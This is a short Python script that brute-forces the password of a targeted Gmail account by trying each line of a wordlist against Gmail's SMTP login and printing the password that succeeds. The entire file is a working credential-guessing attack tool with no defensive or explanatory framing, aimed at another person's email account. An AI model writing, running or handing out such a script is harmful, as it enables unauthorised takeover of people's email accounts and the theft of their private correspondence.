#!/usr/bin/env python
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter target Email ID: ")
passw = raw_input("Enter password file name(wordlist.txt path or name): ")
passw = open(passw, "r")

for password in passw:
    try:
        smtpserver.login(user, password)
        print("Password Found: %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("Password Not Found: %s" % password)